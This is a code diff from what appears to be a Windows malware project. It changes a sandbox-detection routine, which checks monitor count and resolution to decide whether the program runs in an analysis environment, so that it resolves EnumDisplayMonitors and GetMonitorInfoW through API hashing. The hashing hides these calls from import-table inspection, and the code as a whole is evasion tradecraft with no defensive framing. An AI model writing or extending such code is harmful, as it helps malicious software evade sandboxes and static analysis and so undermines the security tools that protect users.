@@ -220,8 +220,11 @@ BOOL CALLBACK resolution_callback(HMONITOR monitor, HDC hdc, LPRECT lprect, LPAR
 
 	int X = 0, Y = 0;
 	MONITORINFO MI = { .cbSize = sizeof(MONITORINFO) };
+	
+	HMODULE user32_module = get_module_handle_hash(USER32DLL_HASH);
+	fnGetMonitorInfoW pGetMonitorInfoW = get_proc_address_hash(user32_module, GetMonitorInfoW_HASH);
 
-	if (!GetMonitorInfoW(monitor, &MI)) {
+	if (!pGetMonitorInfoW(monitor, &MI)) {
 		return FALSE;
 	}
 
@@ -249,7 +252,9 @@ BOOL check_resolution() {
 	BOOL	SANDBOX = FALSE;
 
 	// SANDBOX will be set to TRUE by 'EnumDisplayMonitors' if a sandbox is detected
-	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)resolution_callback, (LPARAM)(&SANDBOX));
+	HMODULE user32_module = get_module_handle_hash(USER32DLL_HASH);
+	fnEnumDisplayMonitors pEnumDisplayMonitors = get_proc_address_hash(user32_module, EnumDisplayMonitors_HASH);
+	pEnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)resolution_callback, (LPARAM)(&SANDBOX));
 
 	return SANDBOX;
 }
